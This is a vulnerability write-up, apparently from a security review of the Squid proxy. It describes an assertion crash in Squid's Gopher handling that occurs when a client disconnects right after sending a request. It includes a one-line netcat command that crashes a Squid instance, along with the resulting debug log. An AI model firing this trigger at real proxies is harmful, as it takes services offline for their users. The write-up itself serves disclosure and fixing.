
# Gopher Assertion Crash

Note: This issue is similar to that of `RFC 2141 / 2169 (URN) Assertion Crash`, and thus a detailed description is not given. However, this issue pertains to how Squid handles sending of Gopher requests to Gopher servers.

## The Issue
When a client opens a connection with Squid and subsequently closes it, its so-called 'store entry' is marked as 'pending' (STORE_PENDING) and 'completed' (STORE_OK) respectively. If an attempt is subsequently made to write to that store entry after it has been set to STORE_OK, Squid will crash with an assertion, as it generally means something is 'wrong'.

Due to Squid marking a store as 'completed' upon a client disconnecting, it is possible to trick Squid into requesting a Gopher page, then quickly disconnecting, resulting in a write to a store which has been marked as STORE_OK.

In theory, this issue could affect HTTP too, however there are protections in place within the HTTP end-points to stop the processing of asynchronous replies when an entry has been aborted (such as due to a client closing the connection before the reply has been read) For example in `HttpStateData::readReply` and `HttpStateData::processReplyBody`, there is a check before the entry writing:
```
    if (EBIT_TEST(entry->flags, ENTRY_ABORTED)) {
        abortTransaction("store entry aborted while reading reply");
        return;
    }
```

In the case of Gopher requests, there is also this protection in place for when a *reply* is received; aka in the function `gopherReadReply`.
However, this protection is not in place in the `gopherSendComplete` function, which is called when a client initially connects. This means that a client can send a Gopher request to Squid, and instantly close their connection, to cause an assertion.

Therefore, it is as simple as running the following command to crash Squid:
```
printf "GET gopher://gopher.floodgap.com/ HTTP/1.1\r\n\r\n" | timeout 0.1 nc localhost 3128
```
This will close the connection after 0.1 seconds, which will result in the following assertion/crash:

```
2021/04/18 04:13:45.863| 88,3| client_side_reply.cc(1081) storeOKTransferDone: storeOKTransferDone  out.offset=3628 objectLen()=3903 headers_sz=275
2021/04/18 04:13:45.863| 5,3| IoCallback.cc(112) finish: called for conn36 local=127.0.0.1:3128 remote=127.0.0.1:57126 FD 20 flags=1 (-10, 0)
2021/04/18 04:13:45.863| 33,2| client_side.cc(942) kick: conn36 local=127.0.0.1:2222 remote=127.0.0.1:57126 flags=1 Connection was closed
2021/04/18 04:13:45.864| 20,3| store.cc(486) unlock: ClientHttpRequest::loggingEntry unlocking key 1100000000000000DDAA030000000000 e:=sXIV/0x60c000073780*1
2021/04/18 04:13:45.864| 90,3| store_client.cc(805) storePendingNClients: storePendingNClients: returning 0
2021/04/18 04:13:45.864| 20,3| store.cc(1178) release: 0 e:=sXIV/0x60c000073780*0 1100000000000000DDAA030000000000
2021/04/18 04:13:45.864| 20,3| store.cc(400) destroyMemObject: 0x61300001d540 in e:=sXIV/0x60c000073780*0
2021/04/18 04:13:45.864| 20,3| MemObject.cc(108) ~MemObject: MemObject destructed, this=0x61300001d540
2021/04/18 04:13:45.864| 20,3| store.cc(418) destroyStoreEntry: destroyStoreEntry: destroying 0x60c000073788
2021/04/18 04:13:45.864| 20,3| store.cc(400) destroyMemObject: 0 in e:=sXIV/0x60c000073780*0
2021/04/18 04:13:45.864| 85,3| client_side_request.cc(118) ~ClientRequestContext: ClientRequestContext destructed, this=0x60b00008b7f8
2021/04/18 04:13:45.865| 20,3| store.cc(1763) replaceHttpReply: StoreEntry::replaceHttpReply: gopher://gopher.floodgap.com/
2021/04/18 04:13:45.866| assertion failed: store.cc:832: "store_status == STORE_PENDING"
```
